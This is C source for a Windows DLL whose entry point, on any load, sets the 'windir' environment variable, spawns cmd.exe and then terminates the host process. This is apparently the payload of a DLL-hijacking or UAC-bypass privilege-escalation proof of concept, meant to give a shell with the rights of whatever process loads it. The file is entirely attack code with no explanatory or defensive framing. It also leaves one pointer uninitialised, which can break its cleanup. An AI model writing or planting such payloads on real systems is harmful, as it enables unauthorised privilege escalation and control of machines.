#include <Windows.h>
#include <ShlObj.h>

PWSTR PaConcatString(
	PWSTR string,
	PWSTR appendString
)
{
	PWSTR data = (PWSTR)HeapAlloc(GetProcessHeap(), 0,
		((wcslen(string) * sizeof(WCHAR)) + sizeof(L'\0')) +
		((wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0')));
	if (data) {
		memcpy(data, string, wcslen(string) * sizeof(WCHAR));
		memcpy(data + wcslen(string), appendString,
			(wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0'));
	}
	return data;
}

__declspec(noreturn)
void WINAPI DllMain(
	HINSTANCE hInstance,
	DWORD reason,
	LPVOID reserved
)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(reason);
	UNREFERENCED_PARAMETER(reserved);

	PWSTR winDir, system32 = NULL;
	HRESULT hr;
	UINT exitCode;
	PWSTR cmdPath = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	hr = SHGetKnownFolderPath(&FOLDERID_Windows, 0, NULL, &winDir);
	if (!SUCCEEDED(hr)) {
		exitCode = (UINT)hr;
		goto eof;
	}
	hr = SHGetKnownFolderPath(&FOLDERID_System, 0, NULL, &system32);
	if (!SUCCEEDED(hr)) {
		exitCode = (UINT)hr;
		goto eof;
	}

	cmdPath = PaConcatString(system32, L"\\cmd.exe");
	if (!cmdPath) {
		exitCode = (UINT)HRESULT_FROM_WIN32(ERROR_OUTOFMEMORY);
		goto eof;
	}

	if (!SetEnvironmentVariableW(L"windir", winDir)) {
		exitCode = (UINT)HRESULT_FROM_WIN32(GetLastError());
		goto eof;
	}

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);
	if (!CreateProcessW(cmdPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		exitCode = (UINT)HRESULT_FROM_WIN32(GetLastError());
		goto eof;
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	exitCode = 0xDEADBEEF;

eof:
	if (winDir)
		CoTaskMemFree(winDir);
	if (system32)
		CoTaskMemFree(system32);
	if (cmdPath)
		HeapFree(GetProcessHeap(), 0, cmdPath);
	ExitProcess(exitCode);
}